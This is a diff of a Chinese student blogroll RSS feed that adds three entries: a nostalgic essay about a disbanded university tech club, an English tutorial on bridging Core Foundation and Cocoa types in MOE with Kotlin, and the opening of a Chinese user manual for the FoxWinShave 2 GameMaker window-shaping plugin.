@@ -3,7 +3,7 @@
     <generator>NUAA</generator>
     <id>https://blogroll.a2os.club</id>
     <title>NUAARSS</title>
-    <updated>2020-03-12T09:17:23+08:00</updated>
+    <updated>2020-03-12T09:32:37+08:00</updated>
     <link href="https://blogroll.a2os.club"/>
     <author>
         <name>NUAARSS</name>
@@ -785,6 +785,271 @@ GLU_TESS_WINDING_ABS_GEQ_TWO：如果结果大于等于 2 则被填充</code></p
         <content type="text/html" src="https://yuwenjie.cc/2019-iwanttofly.html"><![CDATA[<p>这篇文章我肚子里想了好多好多的标题，从最早的《从 mynuaa 到 nuaa》，到《从校服到版对婚礼》，到很多很多很多很多，听起来非常有仪式感的名字。但是每次都感觉，我没有办法驾驭那么高的标题，倒闭文章如果写的不好，会成为很多人心里永远的结，而且这个结真的真的是再也没有机会去纠正了。</p><p>————写在前边</p><blockquote><p>--“iwanttofly，全部小写”<br>--“to是2还是T, O啊”<br>--“to”<br>--“....这是不是和没说一样”<br>--“俩字母的那个”</p></blockquote><p>这是我和 rex 比较“早（you）期（chi）”的一段对话。</p><p>不知道从什么时候开始，<code>iwanttofly</code>就是办公室的 WIFI 密码，从最早的单频<code>ZFJ-office</code>，到后来有了双频，<code>ZFJ-5G</code>，密码一直都是这个。其实 rex 的那段对话之后，没有翻译给我这句话是什么意思，记得他当时是在打太鼓还是和新生工作组的小（nv）朋（hai）友（zi）聊来着。当时我自己琢磨，这个密码还蛮有两航特色的咯，我想上天，很主旋律。</p><p>我这么想是因为，我没有去2016年纸飞机的那一场新生晚会。</p><p>其实我去了，那次在三食堂的三楼，被一个小姐姐以已经坐满了为理由，把我赶回去了。</p><p>更令人生气的是，那天晚上黑灯瞎火，我也没认出来他是谁（现在严重怀疑就是林青2333。</p><p>所以，在很久之后的蛋蛋晚会，我才知道了这个小slogan的含义——</p><p>这里是离梦想最近的地方呀。</p><p>在之后的很多很多年里，我每天晚上在办公室里，对着来修电脑的大小朋友们，说了一次又一次的<code>iwanttofly</code>，大部分人其实也没有问我当时问的那个问题；当然，可能更也没有去想，这句话到底是什么意思，这个办公室里这群疯狂的人，到底为什么老是想着上天？</p><p>那年蛋蛋晚会的时候，开会讨论怎么宣传，我提了一个修改自己宿舍里的WIFI名和在教室布置AP/手机热点的方法，可能碍于当时只是一个小干事，身份卑微，可怜巴巴的没有人采用这个中二的想法，只能自己改成了这个，现在还存在记事本的第二行——大学的新开的一个记事本。</p><p><img src="https://cdn.jsdelivr.net/gh/seiry/img-outer@img//2016.1225-wifi.png" alt="蛋蛋wifi" title="蛋蛋wifi"></p><p>那年的蛋蛋晚会，rex说不想用斗鱼的直播，要用自己的技术，那时候自己（rex自己，我看着）编译nginx，看<code>flv.js</code>，看<code>hls.js</code>，夹杂着<code>diygod</code>的生平故事，后来顶着南航校园网无敌的qos策略和网络质量，顶着沈学姐本部跑来跑去的保密协议申请，勉强实现了个位数并发的推流直播。</p><p>结束之后，收拾东西，从地上揭起网线的时候，我明白了 rex 对于自己做直播的执念——</p><p>我们的梦想，终究是只属于我们的。</p><p>当时b站的直播还没有做大，斗鱼也远远没有被腾讯纳入版图，对于技术的执念，使我们依然没有选择妥协，宁可在南航这片稍显贫瘠的土地上，去带着镣铐舞蹈。</p><p>下一次的直播加上了七牛的cdn，那年的七牛，也不用太实名认证，还可以用二级域名，流畅度终于还是能满足老人们看一眼的心愿。十分惭愧的是，rex走了之后，我没有再用那一套系统，上一年达叔找我帮我直播16院毕业晚会的时候，我也妥协选择了b站的现成轮子。</p><p>同样的obs，同样的16级毕业晚会，甚至是同一台电视台的摄像机，同样的送走一帮人，只是这次走的是达叔耗子哥哥和邓理juju，上次离开的是大白rex。惭愧的是我，有一些东西没有能够继承下来。</p><p>同样的那个舞台的位置，也是我做部长的成员大会的地方，欠款￥5000的地方。那天大家都穿的正装，女孩子们都花了口红，那次小菜妮的口红真的画的很拙略，宋梦娜给我系的领带也很拙略，我和王娟的自拍照片也很拙略。但是丝毫不影响，之后大家走出的精彩的路，和那次书记读错纸飞机的名字。</p><p>不知道还有多少人记得那次蛋蛋晚会的快闪。叫做快闪，可能也不是为了被人永远的记住，只是参与者永远的记住了吧。那天新的站衫还有没有到，我第一次穿的是老人们的上一年的站衫，而现在，我已经有那么多那么多件的站衫了，那是永远穿出去不会丢人的东西。</p><p>不过站衫的材质，随着世风的日下，变得越来越不好了，也很痛心的看到，小孩子们买的越来越少；也很难受让他们去买，以此来给组织提供经济支持。我以前有个蛮神奇合理的想法——一个人，最多只能拥有三件纸飞机的站衫，后来觉得不妥，应该是三套，毕竟春夏秋冬；又觉得还是不妥，rex就有四年的；到了现在四年的也不妥了，因为我还往前嫖了好多年的，现在穿着六周年的那件t恤，自豪感十足，身份和地位的象征。</p><p>我之前说过，一个学校好，不代表在学校里的你会好——因为我们通常说的名校，更多的指的是他的上限。其实我是不知道，正式发公告的第二天是学校的校庆——又有多少人记得呢。“死在黎明的前夜”，乍一听还是个满浪漫的说法的。依附于这样的一个日子，大家在追思纸飞机的时候，就有一个标记了，这样南航就变成了纸飞机的粽子，纸飞机一直是南航的屈原。<code>mynuaa</code>是纸飞机的官方英文名字，但是不知道啥时候开始，差不多是我这一届的小朋友，开始叫更多地写成<code>nuaazfj</code>，两个英文名都有很多好玩的谐音梗，“买南航”“卖南航”“马原南航”，“nuaa政府军”“nuaa造反军”“nuaa执法局”。我是更喜欢<code>mynuaa</code>一点——我在意的区别其实my是nuaa的定语，nuaa是zfj的定语。zfj可能只有一个，但是my，有千千万万个，千千万万个my背后，是千千万万个善良单纯的梦想。有人教导我们，在大的利益面前，要妥协，要退让，要牺牲小的利益，牺牲小我，因此<code>nuaa</code>如此的洪亮，每年吸引了多少善男信女；但是吸引他们的是南航的头部，头部也正需要更多人的加入来垫起脚跟。纸飞机曾经很让我以之为傲的就是，技术部的部长都好nb啊，bat可以各种拉满，这对年级小的时候的我，充满了无穷的偶像吸引。虽然每个人的观察都是有偏差的，几乎每个人都找得到工作，每个人都饿不死，每个人也都因为围城而惦记着进进出出，但是bat三个字母，代表真的是优秀。他们和我听说的那些读书学霸并不一样，高数大物无限补考重修，教务处内网游泳片叶不沾，走南闯北无所不能，赚钱养家经济独立，每一个特质我都好喜欢，当时我应该算是“悄悄地”下定决心吧，也要成为像他们一样的人，尽管有一些东西可能是坏的。在我看来，他们在选择就业时的从容，选择余地的开阔，才是大学带来的最有用的东西——当然这最有用的东西，对于一个学校也只是一个数字，理应如此。所以我也看来，他们是真正代表这个学校头部的那些人。</p><p>有一个学长，开玩笑说，“等谁以后nb了，回学校，就问问校长，纸飞机现在在干啥”。真正的头部，永远不会在当下去想尽办法得到别人的点头认同——ta是隽永而深远的。</p><p>所以，当<code>mynuaa</code>变成了<code>nuaa</code>，失去的是它的<code>prefix</code>，它的头部，也是它曾经鲜明的一面旗帜。</p><p>今年又是一年招新已经结束了，小朋友们多多少少去了各种各样学生组织学生社团，或是背着南航的旗帜在工作，或是背着自己的爱好在工作，他们口中的“我航”，什么时候回变成“你航”呢？</p><p><img src="https://cdn.jsdelivr.net/gh/seiry/img-outer@img//bandui.png" alt="版对" title="版对"></p><p>虽然我现在也觉得，学生组织不是个找对象的最佳实践，但是对于大部分写代码的男孩子来说，纸飞机真的曾经是个神奇的地方。有共同的追求和信仰，共同激励过困难，这是产生火花的重要因素。曾经版主之间的火花，就是尤其强烈的。多少人曾经做过校服到礼服的华丽美梦呀，又有多少人能实现呢？大学的互联网藩篱被移动互联网推到，大家加入了更大的池子，那个有趣的灵魂，也就越来越难和你在无规则运动的时候碰到了，的确也只能惋惜了。</p><p>清补凉的老板，一直是纸飞机的吉祥物，或者说是技术部的吉祥物。他和曾经的后街各家店一起，是纸飞机共同的回忆。但是豆花店换了一个又一个的老板，煎饺也一次又一次的变味，没有人知道南航共同的胃还能坚持多久。但是这不影响涉世未深的新人——他们的第一口，就是这样的；他们的第一眼，正新鸡排也就是10块钱的；眼里的学生会，也就是四个部门的；眼里的社联，也就是社团管理部；眼里的团委，也就是红星闪闪，引领前进方向的排头马。</p><p>写的太乱太乱了，因为断断续续写下来，心情也变过很多次，主题也变过很多次，我也不知道，对于解散这件事情，应该隐晦？应该直白？应该辞藻华丽？太多太多的答案，11年的成长岁月里，真的真的不足以解答；但是闪闪夺目的11年岁月，又是再华丽的词汇句式不能表达的。</p><p>但是至少有一点，我可以坚信的是，纸飞机在这片土地上，的的确确不存在了；因此我们就坚信，纸飞机已经飞到了我们的梦想地方，在那里等我们。</p><p>四年前，纸飞机告诉我们，这里是离梦想最近地方；现在纸飞机告诉你，她很好，她在那里等着你，你一定要坚持走下去呀！</p>]]></content>
         <author>
             <name><![CDATA[善良单纯的板の窝]]></name>
+        </author>
+    </entry>
+    
+    <entry>
+        <id>https://www.noisyfox.io/moe-native-types.html</id>
+        <title><![CDATA[Working with native types: Advanced]]></title>
+        <updated>2019-09-22T05:23:17+08:00</updated>
+        <link href="https://www.noisyfox.io/moe-native-types.html"/>
+        <content type="text/html" src="https://www.noisyfox.io/moe-native-types.html"><![CDATA[<p>After using MOE for several years we discovered some common problems when dealing with native types (Core Foundation Types &amp; Cocoa Types). Here are some of our findings.</p>
+
+
+
+<h1>Container Types (NSArray, NSDictionary, CFArrayRef, etc.)</h1>
+
+
+
+<ol><li>The content in those containers must be corresponding native types, e.g., values of a <code>NSArray</code> must all be <code>NSObject</code>s, while values of a <code>CFArrayRef</code> must all be <code>OpaquePtr</code>s.<ol><li>NatJ does not automatically convert Java-only types (include primitive types) to compatible native types and vice versa when dealing with containers. When adding values to those containers you need to manually convert it to a corresponding native type. And when reading the value you also need to explicitly convert it to a Java type.</li><li>If you try to store a <strong>Core Foundation</strong> type in a <strong>Cocoa</strong> container, you need to cast it using the <strong>Toll-Free Bridging</strong> which I will talk about later.</li></ol></li><li>Arrays and dictionaries can not have <code>null</code> as either key or value.</li></ol>
+
+
+
+<p>If you ever used the iOS <strong>KeyChain</strong> APIs you may did something similar as follows in Objective-C(simplified):</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">CFErrorRef error = NULL;
+
+SecAccessControlRef access =
+SecAccessControlCreateWithFlags(kCFAllocatorDefault,
+                                kSecAttrAccessibleWhenUnlockedThisDeviceOnly,
+                                kSecAccessControlPrivateKeyUsage|kSecAccessControlUserPresence,
+                                &amp;error);
+
+NSData* tag = [@"some tag" dataUsingEncoding:NSUTF8StringEncoding];
+
+NSDictionary* attributes =
+@{ (id)kSecClass:                   (id)kSecClassKey,
+   (id)kSecAttrKeyType:             (id)kSecAttrKeyTypeECSECPrimeRandom,
+   (id)kSecAttrKeySizeInBits:       @256,
+   (id)kSecAttrTokenID:             (id)kSecAttrTokenIDSecureEnclave,
+   (id)kSecPrivateKeyAttrs:
+       @{ (id)kSecAttrIsPermanent:    @YES,
+          (id)kSecAttrApplicationTag:  tag,
+          (id)kSecAttrAccessControl:  (__bridge id)access
+        },
+   };
+
+SecKeyRef privateKey = SecKeyCreateRandomKey((__bridge CFDictionaryRef)attributes,
+                                             &amp;error);</pre>
+
+
+
+<p>The corresponding Kotlin code will be:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val pError = PtrFactory.newOpaquePtrReference(CFErrorRef::class.java)
+
+val access = Security.SecAccessControlCreateWithFlags(
+    CoreFoundation.CFAllocatorGetDefault(),
+    Security.kSecAttrAccessibleWhenUnlockedThisDeviceOnly(),
+    SecAccessControlCreateFlags.PrivateKeyUsage or SecAccessControlCreateFlags.UserPresence,
+    pError
+)
+val tag = NSString.stringWithString("some tag").dataUsingEncoding(NSUTF8StringEncoding)
+
+// Helper function to convert a CF type to Cocoa type
+fun OpaquePtr.toNSObject() = ObjCRuntime.cast(this, NSObject::class.java)
+
+val privateKeyAttrs = NSMutableDictionary.dictionary&lt;Any, Any>() as NSMutableDictionary&lt;Any, Any>
+privateKeyAttrs[Security.kSecAttrIsPermanent().toNSObject()] = NSNumber.numberWithBool(true) // Convert Java `boolean` to Cocoa type
+privateKeyAttrs[Security.kSecAttrApplicationTag().toNSObject()] = tag
+privateKeyAttrs[Security.kSecAttrAccessControl().toNSObject()] = access.toNSObject()
+
+val attributes = NSMutableDictionary.dictionary&lt;Any, Any>() as NSMutableDictionary&lt;Any, Any>
+attributes[Security.kSecClass().toNSObject()] = Security.kSecClassKey().toNSObject()
+attributes[Security.kSecAttrKeyType().toNSObject()] = Security.kSecAttrKeyTypeECSECPrimeRandom().toNSObject()
+attributes[Security.kSecAttrKeySizeInBits().toNSObject()] = NSNumber.numberWithInt(256) // Convert Java `int` to Cocoa type
+attributes[Security.kSecAttrTokenID().toNSObject()] = Security.kSecAttrTokenIDSecureEnclave().toNSObject()
+attributes[Security.kSecPrivateKeyAttrs().toNSObject()] = privateKeyAttrs
+
+// Cast NSDictionary to CFDictionaryRef
+val cfAttributes = ObjCRuntime.cast(attributes, CFDictionaryRef::class.java)
+
+val privateKey = Security.SecKeyCreateRandomKey(cfAttributes, pError)</pre>
+
+
+
+<p>With the help of <a href="https://github.com/Noisyfox/NatJ-Kotlin">this library</a> I created, the code can be simplified as:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val pError = PtrFactory.newOpaquePtrReference(CFErrorRef::class.java)
+
+val access = Security.SecAccessControlCreateWithFlags(
+    CoreFoundation.CFAllocatorGetDefault(),
+    Security.kSecAttrAccessibleWhenUnlockedThisDeviceOnly(),
+    SecAccessControlCreateFlags.PrivateKeyUsage or SecAccessControlCreateFlags.UserPresence,
+    pError
+)
+
+val attributes = mapOf&lt;Any,Any>(
+    Security.kSecClass() to Security.kSecClassKey(),
+    Security.kSecAttrKeyType() to Security.kSecAttrKeyTypeECSECPrimeRandom(),
+    Security.kSecAttrKeySizeInBits() to 256,
+    Security.kSecAttrTokenID() to Security.kSecAttrTokenIDSecureEnclave(),
+    Security.kSecPrivateKeyAttrs() to mapOf&lt;Any,Any>(
+        Security.kSecAttrIsPermanent() to true,
+        Security.kSecAttrApplicationTag() to "some tag".toNSData(),
+        Security.kSecAttrAccessControl() to access
+    )
+).toNSDictionary()
+
+val privateKey = Security.SecKeyCreateRandomKey(attributes.bridge(), pError)</pre>
+
+
+
+<p>This library also has a help function for creating <code>NSArray</code> from a Java <code>Collection</code>:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val nsArray = listOf(1, 2, 3, "some string", someCFRef, someNSType).toNSArray()</pre>
+
+
+
+<h1>Toll-Free Bridging &amp; Memory Management</h1>
+
+
+
+<p>iOS developers are most likely to be familiar with&nbsp;<strong>Cocoa Touch</strong>&nbsp;frameworks/APIs (does&nbsp;<strong>Foundation</strong>&nbsp;framework sound familiar to you?), which use the programming languages&nbsp;<strong>Objective-C</strong>&nbsp;or&nbsp;<strong>Swift</strong>. </p>
+
+
+
+<p>However, you may also heard about another framework called&nbsp;<strong>Core Foundation</strong>.&nbsp;It is a pure&nbsp;<strong>C</strong>&nbsp;framework and provides access to lower level APIs and types.</p>
+
+
+
+<p>For iOS development, most frameworks you will use are all designed based on the&nbsp;<strong>Foundation</strong>&nbsp;framework which means the types they use are all&nbsp;<code>NSObject</code>s so&nbsp;<strong>ARC</strong>&nbsp;manages the memory for you and the memory will be automatically released when the object is no longer used.&nbsp;<strong>MOE</strong> does some tricks so&nbsp;<strong>Java</strong>&#8216;s&nbsp;<strong>GC</strong>&nbsp;also helps when you use those types on&nbsp;<strong>Java</strong>&nbsp;side.</p>
+
+
+
+<p>However some low level functions (such as&nbsp;<strong>Security</strong>&nbsp;framework if you try to use&nbsp;<strong>TouchId</strong>) are available in only&nbsp;<strong>C</strong>&nbsp;functions. Hens they use&nbsp;<strong>Core Foundation</strong>&nbsp;types which does not have&nbsp;<strong>ARC</strong>&nbsp;and requires manual memory management. Sadly&nbsp;<strong>Java</strong>&#8216;s&nbsp;<strong>GC</strong>&nbsp;does no help here (and may even create new issues which I will talk about later).</p>
+
+
+
+<h2 id="ownership-cfretain-and-cfrelease">Ownership, CFRetain() and CFRelease()</h2>
+
+
+
+<p>Anyone has any&nbsp;<strong>C</strong>&nbsp;experience might still remember those good old days struggling with&nbsp;<code>malloc()</code>&nbsp;and&nbsp;<code>free()</code>&nbsp;while&nbsp;<strong>Core Foundation</strong>&nbsp;brings you&nbsp;<code>CFRetain()</code>&nbsp;and&nbsp;<code>CFRelease()</code>.</p>
+
+
+
+<p>Apple has a fantastic document that tells you how&nbsp;<em>Ownership</em>&nbsp;works in manual memory management and when you should use&nbsp;<code>CFRetain()</code>and&nbsp;<code>CFRelease()</code>&nbsp;respectively. I highly recommend you to read it first:</p>
+
+
+
+<p>Link:&nbsp;<a href="https://developer.apple.com/library/archive/documentation/CoreFoundation/Conceptual/CFMemoryMgmt/Concepts/Ownership.html">Memory Management Programming Guide for Core Foundation &#8211; Ownership Policy</a></p>
+
+
+
+<p>Basically if an Core Foundation object is owned by you, you need to call&nbsp;<code>CFRelease()</code>&nbsp;once you are done with it; if it&#8217;s NOT owned by you, in most cases, you need to&nbsp;<code>CFRetain()</code>&nbsp;it, use it, then&nbsp;<code>CFRelease()</code>&nbsp;it afterwards:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Create a CFString, which is owned by you
+CFStringRef urlStr = CFStringCreateWithCString(kCFAllocatorDefault,
+    "https://www.noisyfox.io", kCFStringEncodingUTF8);
+
+/* Do something with urlStr here. */
+
+// Release it afterwards
+CFRelease(urlStr);
+</pre>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Get something from a dict, which is not owned, so a CFRetain() is required
+CFStringRef title = (CFStringRef)CFRetain(CFDictionaryGetValue(dict, CFSTR("title")));
+
+/* Do something with title here. */
+
+// Release it afterwards
+CFRelease(urlStr);
+</pre>
+
+
+
+<p>You can easily convert above code to&nbsp;<strong>Java</strong>&nbsp;since MOE bindings provide all necessary functions. And with a little help from my library, you could write something like these in&nbsp;<strong>Kotlin</strong>:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">CFStringCreateWithCString(kCFAllocatorDefault(), "title", CFStringBuiltInEncodings.UTF8).use { key ->
+
+    CFDictionaryGetValue(dict, key).cast&lt;CFStringRef>().retain().use { title ->
+        /* Do something with title here. */
+    }
+}
+// CFRelease is automatically called when block returns
+</pre>
+
+
+
+<p>The&nbsp;<code>action</code>&nbsp;block of&nbsp;<code>.use()</code>&nbsp;is wrapped in a&nbsp;<code>try</code>&nbsp;block so the resource is guaranteed to be released even if&nbsp;<strong>Exception</strong>&nbsp;is raised in the block.</p>
+
+
+
+<h2 id="autoreleasepool-for-core-foundation-types"><code>autoreleasepool</code>&nbsp;for&nbsp;<strong>Core Foundation</strong>&nbsp;types</h2>
+
+
+
+<p><code>.use()</code>&nbsp;mentioned above will create a lot of nested scopes if you have a lot of those&nbsp;<strong>Core Foundation</strong>&nbsp;objects. That makes the code unreadable. With the help of&nbsp;<code>autoreleasepool</code>&nbsp;you could rewrite the above code to something like this:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">autoreleasepool {
+    val key = CFStringCreateWithCString(kCFAllocatorDefault(), "title", CFStringBuiltInEncodings.UTF8).autorelease()
+    val title = CFDictionaryGetValue(dict, key).cast&lt;CFStringRef>().retain().autorelease()
+
+    /* Do something with title here. */
+}
+// CFRelease is automatically called for each object that called .autorelease() when autoreleasepool block ends
+</pre>
+
+
+
+<p><strong>NB</strong>: Make sure the&nbsp;<code>autoreleasepool</code>&nbsp;you called is imported from package&nbsp;<code>io.noisyfox.moe.natj</code>&nbsp;since&nbsp;<strong>NatJ</strong>&nbsp;has it&#8217;s own impl&nbsp;<code>org.moe.natj.objc.ObjCRuntime#autoreleasepool(java.lang.Runnable)</code>&nbsp;which is not a&nbsp;<strong>Kotlin</strong>&nbsp;<code>inline</code>&nbsp;function which doesn&#8217;t support certain features (such as&nbsp;<a href="https://kotlinlang.org/docs/reference/inline-functions.html#non-local-returns">non-local returns</a>&nbsp;and&nbsp;<a href="https://kotlinlang.org/docs/reference/inline-functions.html#reified-type-parameters">reified type parameters</a>).</p>
+
+
+
+<h2 id="type-bridging">Type Bridging</h2>
+
+
+
+<p>WIP</p>
+
+
+
+<h1>Misc</h1>
+
+
+
+<p>The library also contains some other help functions for converting between Java types and native types such as <code>ByteArray</code> &lt;=&gt; <code>NSData</code>. I won&#8217;t list all functions here since you could easily find them in source code.</p>
+
+
+
+<h1>The library &#8211; <strong><a href="https://github.com/Noisyfox/NatJ-Kotlin">NatJ-Kotlin</a></strong></h1>
+
+
+
+<p>This is a library I created that contains some helper functions I used in my work. It&#8217;s currently available in only source code form. I will create a jar release and publish it to jcenter ASAP.</p>
+
+
+
+<p>The library is written in Kotlin but most of the functions can also be used in Java.</p>
+
+
+
+<h1>Discussion</h1>
+
+
+
+<p>Any idea of  library improving are welcomed. If you found any mistake in my post, or have any other problem that is not covered, please not hesitate to share with us by leaving comments.</p>
+<p><a rel="nofollow" href="https://www.noisyfox.io/moe-native-types.html">Working with native types: Advanced</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
+        <author>
+            <name><![CDATA[狐狸的小小窝]]></name>
         </author>
     </entry>
     
@@ -1821,6 +2086,286 @@ void start_coroutine(struct Coroutine *co) {
     </entry>
     
     <entry>
+        <id>https://www.noisyfox.io/foxwinshave2.html</id>
+        <title><![CDATA[FoxWinShave 2 中文使用手册]]></title>
+        <updated>2019-01-12T08:45:27+08:00</updated>
+        <link href="https://www.noisyfox.io/foxwinshave2.html"/>
+        <content type="text/html" src="https://www.noisyfox.io/foxwinshave2.html"><![CDATA[<p>FoxWinShave 2 现已上架 GameMaker: Marketplace，支持 GM8, GMS 1.4 和 GMS 2。<a href="https://marketplace.yoyogames.com/assets/7696/foxwinshave" target="_blank" rel="noreferrer noopener" aria-label="（在新窗口打开）">点此从Marketplace下载最新版本</a>。</p>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<h2>0. 前置条件</h2>
+
+
+
+<ul><li>仅支持 Windows 平台。</li><li>支持 Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10。</li><li>支持 GameMaker 7, GameMaker 8, GameMaker 8.1, GameMaker Studio 1.4.x, GameMaker Studio 2 Desktop。</li></ul>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<h2>1. 安装插件</h2>
+
+
+
+<h3>1.0 GM 7, 8, 8.1</h3>
+
+
+
+<p>菜单栏 File-&gt; Import Resources&#8230; 选择 FoxWinShave-GM8.gmres 导入插件及 Demo。</p>
+
+
+
+<ul><li>在弹出的 Importing Resources 对话框中，请务必勾选 Scripts 和 Include Files 以导入插件运行所必须的文件和脚本。</li><li>如需同时导入 Demo 代码及素材，请将 Sprites，Objects 和 Rooms 一并勾选上。</li></ul>
+
+
+
+<h3>1.1 GMS 1.4.x 及 GMS 2 Desktop</h3>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-300x189.png" alt="" class="wp-image-569" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-300x189.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-768x483.png 768w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-1024x644.png 1024w, https://www.noisyfox.io/wp-content/uploads/2019/01/image.png 1588w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>Import resources: FoxWinShave 对话框</figcaption></figure></div>
+
+
+
+<ol><li>在 GameMaker: Marketplace 上购买本插件。<a rel="noreferrer noopener" aria-label="（在新窗口打开）" href="https://marketplace.yoyogames.com/assets/7696/foxwinshave" target="_blank">（点此购买）</a></li><li>在 GMS 中菜单栏选择 Marketplace -&gt; MyLibrary，找到 FoxWinShave，点击 Download。</li><li>下载完成后，点击 Import。</li><li>在弹出的 Import resources: FoxWinShave 对话框中，选中 Scripts 和 Included Files，然后点击中间的 Add 按钮以导入插件运行所必须的文件和脚本。</li><li>如需同时导入 Demo 代码及素材，那就直接点击中间的 Add All 按钮。</li><li>点击左下角 Import 按钮完成插件的导入。</li></ol>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<h2>2. 插件入门 101</h2>
+
+
+
+<h3>2.0 基础准备</h3>
+
+
+
+<p>请务必在游戏设置中将窗口设置为无边框（borderless window）:</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2-300x240.png" alt="" class="wp-image-592" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2-300x240.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-2.png 512w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>GM 8 设置无边框</figcaption></figure></div>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1-300x237.png" alt="" class="wp-image-591" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1-300x237.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-1.png 695w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>GMS 2 设置无边框</figcaption></figure></div>
+
+
+
+<p>稍后将会解释需要设置为无边框的原因。</p>
+
+
+
+<h3>2.1 插件初始化</h3>
+
+
+
+<p>使用本插件的任何脚本前需要先进行插件的初始化。建议在首个 Room 的 Creation Code 内或者某个控制用的 Object 的 Game Start 事件里执行：</p>
+
+
+<pre class="brush: cpp; title: ; notranslate">
+NF_WS_Init();
+</pre>
+
+
+<p>插件初始化后请勿再次调用该函数。</p>
+
+
+
+<h3>2.2 插件释放</h3>
+
+
+
+<p>当不再需要更改窗口形状后，可以执行以下函数将插件卸载以释放资源：</p>
+
+
+<pre class="brush: cpp; highlight: [2]; title: ; notranslate">
+NF_WS_ResetWindow(); // 重置窗口形状为默认，非必要
+NF_WS_Free(); // 释放插件
+</pre>
+
+
+<p>在释放插件后如果需要再次使用本插件，需要重新进行插件的初始化。</p>
+
+
+
+<h3>2.3 基础原理解释</h3>
+
+
+
+<h4>2.3.0 窗口坐标系</h4>
+
+
+
+<p>将游戏窗口想象成一个画布，按照窗口的边框开始算左上角坐标为 (0, 0)，右下角边框最外处坐标为 (viewport_width + 左边框宽 + 右边框宽, viewport_height + 上边框高 + 下边框高)，如下图所示：</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png" alt="" class="wp-image-635" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png 574w, https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1-300x234.png 300w" sizes="(max-width: 574px) 100vw, 574px" /></a><figcaption> <br>窗口坐标系统 </figcaption></figure></div>
+
+
+
+<p>然而问题在于窗口的边框宽度是由 Windows 系统定义的，不同 Windows 版本或者不同的主题都有可能带有不同尺寸的边框，给在定义窗口的形状时计算坐标带来了麻烦。因此如上文所述，请<strong>务必</strong>在游戏全局设置中关闭窗口边框的显示，这样窗口的坐标系统就和游戏 View Port 的坐标系统的原点能够统一，便于将窗口形状与游戏绘制内容对齐。</p>
+
+
+
+<p>下文在描述坐标时将默认使用无边框窗口。</p>
+
+
+
+<h4>2.3.1 游戏绘制与 View Port</h4>
+
+
+
+<p>GM 支持在一个窗口中同时显示多个 View Port。View Port 的作用是将 Room 的一部分内容按一定比例、缩放和位移映射在窗口中显示出来。用户实际看到的内容是经过 View Port 变换后的结果，并不（一定）是游戏中调用绘制代码时使用的坐标。</p>
+
+
+
+<p>由于我们只关心用户实际看到了什么，因此下文中提到的<strong>“游戏绘制内容”</strong>的尺寸、坐标，皆为经过 View Port 变换后映射到窗口坐标系中的尺寸和坐标。</p>
+
+
+
+<p>更多关于 View Port 的内容，请参考 GM 官方文档，下文将不再赘述。</p>
+
+
+
+<h4>2.3.2 窗口形状遮罩</h4>
+
+
+
+<p>本插件采用遮罩形式设置窗口形状，支持根据 Sprite 和 Surface（仅限 GMS）设置窗口遮罩。以下核心函数</p>
+
+
